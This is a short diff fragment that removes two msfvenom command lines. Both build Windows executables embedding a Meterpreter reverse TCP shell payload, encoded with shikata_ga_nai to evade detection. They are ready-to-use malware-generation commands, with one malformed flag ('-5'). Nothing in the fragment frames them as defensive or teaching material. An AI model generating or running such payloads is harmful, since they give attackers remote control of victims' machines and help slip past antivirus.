@@ -1,3 +1,0 @@
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -5 -f exe > /root/location/file.exe
-msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -5 -f exe > /root/location/file.exe
-
